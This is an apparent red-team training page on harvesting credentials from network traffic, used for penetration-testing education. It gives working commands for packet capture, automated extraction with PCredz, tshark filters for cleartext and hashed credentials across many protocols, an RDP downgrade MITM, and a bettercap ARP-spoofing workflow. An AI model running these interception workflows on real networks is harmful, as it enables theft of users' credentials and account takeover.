---
layout: training-page
title: "Network Credential Hunting — Red Team Academy"
module: "Network Attacks"
tags:
  - credential-hunting
  - network
  - pcap
  - sniffing
  - pcredz
  - wireshark
page_key: "network-credential-hunting"
render_with_liquid: false
---

# Network Credential Hunting

Network traffic contains credentials in cleartext or weakly protected forms far more often than expected. After gaining MITM position (ARP spoofing, rogue DHCP, or physical tap), extract credentials from live traffic or saved captures using automated tools before resorting to manual analysis.

## Live Capture

```bash
# tcpdump — capture everything to PCAP for offline analysis
tcpdump -i eth0 -w /tmp/capture.pcap

# Target credential-bearing ports only
tcpdump -i eth0 -w /tmp/creds.pcap \
  'tcp port 21 or tcp port 23 or tcp port 25 or tcp port 80 \
   or tcp port 110 or tcp port 143 or tcp port 389 \
   or tcp port 445 or tcp port 3389'

# Capture after ARP MITM (bettercap running)
tcpdump -i eth0 -w /tmp/mitm.pcap host 192.168.1.5

# Rotate files every 100MB to avoid filling disk
tcpdump -i eth0 -w /tmp/cap-%Y%m%d-%H%M%S.pcap -C 100 -G 3600
```

## PCredz — Automated Credential Extraction

```bash
# PCredz extracts credentials from live traffic or PCAP
# Protocols: Kerberos, NTLM, FTP, HTTP Basic, POP3, IMAP, SMTP, LDAP,
#            telnet, IRC, SNMP, NTLMv1/v2, Kerberos TGS/AS-REP
# github.com/lgandx/PCredz

# Live capture
python3 Pcredz -i eth0

# From PCAP file
python3 Pcredz -f capture.pcap

# Output saved to /tmp/CredentialsDump.txt
cat /tmp/CredentialsDump.txt
```

## NetworkMiner — Passive Reconstruction

```bash
# NetworkMiner — network forensics; reconstructs sessions, files, credentials
# networkminers.sourceforge.net (Linux/Mono or Windows)

mono NetworkMiner.exe

# Load PCAP → automatically extracts:
# - HTTP Basic Auth credentials
# - FTP passwords
# - Email (SMTP/POP3/IMAP) credentials
# - Reconstructed file transfers (images, documents, etc.)
# - Sessions and hosts tab for easy overview
```

## Protocol-Specific Extraction

### FTP (Port 21)

```bash
# FTP credentials are always cleartext
tcpdump -i eth0 -A 'tcp port 21' | grep -E "USER|PASS"

# Wireshark: ftp.request.command == "USER" || ftp.request.command == "PASS"
tshark -r capture.pcap -Y "ftp.request.command == \"USER\" or ftp.request.command == \"PASS\"" \
  -T fields -e ftp.request.arg
```

### HTTP Basic Auth

```bash
# Authorization header contains base64(user:password)
tcpdump -i eth0 -A 'tcp port 80' | grep "Authorization: Basic"

# Decode the base64
echo "dXNlcjpwYXNzd29yZA==" | base64 -d
# user:password

# Tshark
tshark -r capture.pcap -Y "http.authorization" \
  -T fields -e http.authorization
```

### NTLM — Net-NTLMv1/v2

```bash
# Captured from SMB, HTTP NTLM, or NTLM-authenticated web apps
# Tshark extract NTLMv2 for hashcat
tshark -r capture.pcap -Y "ntlmssp.auth.username" \
  -T fields -e ntlmssp.auth.domain -e ntlmssp.auth.username

# Manual extraction with Wireshark:
# Filter: ntlmssp → follow TCP stream → copy challenge + response
# Format for hashcat (-m 5600):
# user::domain:ServerChallenge:NTProofStr:blob

# PCredz handles this automatically
python3 Pcredz -f capture.pcap
```

### Kerberos — AS-REP and TGS Hashes

```bash
# AS-REP hashes (from accounts with pre-auth disabled) — crack offline
tshark -r capture.pcap -Y "kerberos.msg_type == 11" \
  -T fields -e kerberos.cname -e kerberos.realm

# TGS hashes (kerberoasting) — see AD module
# Kerberos tickets in PCAP
tshark -r capture.pcap -Y "kerberos.msg_type == 13" -V | grep -i "enc-part"

# PCredz extracts Kerberos hashes in hashcat format automatically
```

### LDAP (Cleartext)

```bash
# LDAP on port 389 is cleartext — captures bind credentials
tcpdump -i eth0 -A 'tcp port 389' | grep -i "bindRequest\|password\|uid="

# Tshark
tshark -r capture.pcap -Y "ldap.bindRequest" \
  -T fields -e ldap.name -e ldap.authentication.simple
```

### SMTP / POP3 / IMAP

```bash
# Email credentials from mail clients
tcpdump -i eth0 -A 'tcp port 25 or tcp port 110 or tcp port 143' \
  | grep -E "AUTH|USER|PASS"

# POP3 example
# USER admin
# PASS password123

# SMTP AUTH (base64 encoded)
# AUTH LOGIN
# YWRtaW4=  (admin)
# cGFzc3dvcmQ= (password)
echo "YWRtaW4=" | base64 -d
```

### SNMP Community Strings

```bash
# SNMP v1/v2c community strings are cleartext
tcpdump -i eth0 -A 'udp port 161 or udp port 162'

# Tshark
tshark -r capture.pcap -Y "snmp" -T fields -e snmp.community

# Common community strings found in captures:
# public, private, community, admin, cisco, snmpd
```

### RDP (Port 3389)

```bash
# RDP itself is encrypted but:
# - NLA (Network Level Auth) uses NTLMv2 before TLS → capturable
# - Legacy RDP without NLA sends credentials inside TLS
#   (need cert to decrypt, or proxy via RDP MITM)

# Capture NLA NTLM handshake
tcpdump -i eth0 -w rdp.pcap 'tcp port 3389'
# PCredz or Wireshark → look for NTLMSSP in captured stream

# RDP MITM: Seth
# github.com/SySS-Research/Seth
python3 seth.py eth0 192.168.1.5 192.168.1.10 192.168.1.1
# Proxies RDP, downgrades NLA, captures credentials in cleartext
```

## Automated MITM + Capture Workflow

```bash
# Full workflow: ARP MITM → capture → extract credentials

# 1. Start bettercap (ARP poison + capture)
bettercap -iface eth0 -eval "
  set arp.spoof.targets 192.168.1.5;
  arp.spoof on;
  set net.sniff.output /tmp/mitm.pcap;
  net.sniff on"

# 2. Wait 10-30 minutes during business hours

# 3. Stop capture and extract credentials
python3 Pcredz -f /tmp/mitm.pcap

# 4. Review output
cat /tmp/CredentialsDump.txt
```

## Resources

- PCredz — `github.com/lgandx/PCredz`
- NetworkMiner — `netresec.com/?page=NetworkMiner`
- Seth (RDP MITM) — `github.com/SySS-Research/Seth`
- MITRE T1040 — Network Sniffing — `attack.mitre.org/techniques/T1040/`
- MITRE T1557 — Adversary-in-the-Middle — `attack.mitre.org/techniques/T1557/`
